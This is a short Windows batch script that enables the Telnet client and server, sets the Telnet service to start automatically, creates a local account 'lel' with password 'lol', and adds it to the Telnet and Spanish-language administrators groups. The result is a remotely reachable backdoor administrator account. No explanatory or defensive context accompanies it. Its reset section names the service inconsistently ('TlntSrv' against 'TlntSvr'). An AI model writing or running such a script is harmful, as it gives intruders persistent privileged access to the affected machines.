dism /online /get-featureinfo /featurename:TelnetClient
if not %errorlevel%==0 dism /online /Enable-Feature /FeatureName:TelnetClient
dism /online /get-featureinfo /featurename:TelnetServer 
if not %errorlevel%==0 dism /online /Enable-Feature /FeatureName:TelnetServer
sc config TlntSvr start= delayed-auto
net user lel /add
net user lel lol
net LocalGroup TelnetClients lel /add
net LocalGroup Administradores lel /add
net start telnet||tlntadmn start||sc start TlntSvr
goto :eof
:reset
sc stop TlntSrv
sc start TlntSrv

